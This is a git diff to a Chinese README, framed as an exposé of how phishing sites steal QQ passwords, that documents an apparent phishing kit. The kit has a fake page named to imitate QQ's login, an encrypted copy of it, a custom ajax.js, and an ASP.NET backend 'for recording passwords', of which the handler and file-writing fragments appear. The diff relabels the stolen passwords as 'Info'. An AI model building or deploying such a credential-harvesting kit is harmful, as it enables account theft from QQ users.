@@ -2,9 +2,9 @@
 揭秘钓鱼网站是如何盗取你们的账号密码的（以qq为例）
 
 ##纯页面程序
-`index.html`未加密，`ui.ptlogin2.qq.login.html`是它的加密版。ajax.js是自己写的纯javascript-ajax调用，因为引用JQ的话文件加载回比较慢，这里就用了自己写的东东。
+`index.html`未加密，`ui.ptlogin2.qq.login.html`是它的加密版。`ajax.js`是自己写的纯`javascript-ajax`调用，因为引用JQ的话文件加载回比较慢，这里就用了自己写的东东。
 
-##至于后端用于记录密码的东东。那个太简单，页面我就不放了。代码写下来吧。
+##至于后端用于记录Info的东东。那个太简单，页面我就不放了。代码写下来吧。
 ```
  public void ProcessRequest(HttpContext context)
         {
@@ -28,6 +28,7 @@
             context.Response.End();
         }
         
+        private static string _RootPath = System.Web.HttpRuntime.AppDomainAppPath.ToString();
         
         /// <summary>
         /// 写文件 | 文本
